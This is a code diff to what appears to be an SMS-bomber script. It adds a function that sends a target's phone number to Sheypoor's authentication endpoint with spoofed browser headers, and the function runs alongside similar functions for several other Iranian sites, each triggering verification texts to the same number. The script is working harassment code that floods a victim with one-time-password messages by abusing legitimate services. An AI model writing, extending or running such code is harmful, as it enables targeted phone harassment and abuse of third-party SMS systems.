@@ -91,7 +91,7 @@ def hamrah(number):
   "prevUrl": "https://www.hamrah-mechanic.com/profile/",
   "referrer": "https://www.google.com/"
 }
-    header = headers = {
+    header = {
     "_uti": "3b534c14-3afd-4907-9cfe-258fc84978eb",
     "Accept": "application/json",
     "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -188,6 +188,38 @@ def drdr(number):
     else:
         print(f'{r}({drdrr.status_code}){w} Drdr Not Send !')
 
+def sheypour(number):
+    site = 'https://www.sheypoor.com/api/v10.0.0/auth/send'
+    data = {
+  "username": f"0{number}"
+}
+    header = {
+    "Accept": "application/json",
+    "Accept-Encoding": "gzip, deflate, br, zstd",
+    "Accept-Language": "en-US,en;q=0.8",
+    "Connection": "keep-alive",
+    "Content-Length": "26",
+    "Content-Type": "application/json;charset=UTF-8",
+    "Host": "www.sheypoor.com",
+    "Origin": "https://www.sheypoor.com",
+    "Referer": "https://www.sheypoor.com/session",
+    "sec-ch-ua": '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": '"Windows"',
+    "Sec-Fetch-Dest": "empty",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Site": "same-origin",
+    "Sec-GPC": "1",
+    "User-Agent": generate_user_agent(os="mac"),
+    "X-User-Agent": "Sheypoorx/3.6.471 browser/Chrome.131.0.0.0 os/Windows.10"
+}
+    sheypourr = post(url=site, json=data, headers=header)
+    if sheypourr.status_code == 200:
+        print(f'{g}({sheypourr.status_code}){w} Sheypour Send !')
+    else:
+        print(f'{r}({sheypourr.status_code}){w} Sheypour Not Send !')
+
+
 
 
 
@@ -215,3 +247,4 @@ torob(phone)
 hamrah(phone)
 drdr(phone)
 docterto(phone)
+sheypour(phone)
